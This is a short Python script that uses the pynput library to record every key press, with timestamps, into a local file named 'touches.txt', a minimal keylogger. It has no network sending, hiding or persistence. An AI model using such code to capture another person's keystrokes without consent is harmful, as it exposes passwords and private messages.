# -*- coding: utf-8 -*-
"""
Created on Wed Mar 23 05:50:52 2022

@author: kenzi
"""


from pynput.keyboard import Listener
import logging

file = "touches.txt"
logging.basicConfig(filename=file, level=logging.DEBUG, format="%(asctime)s %(message)s")


def on_press(key):
    logging.info(key)
    

with Listener(on_press=on_press) as listener:
    listener.join()
    
    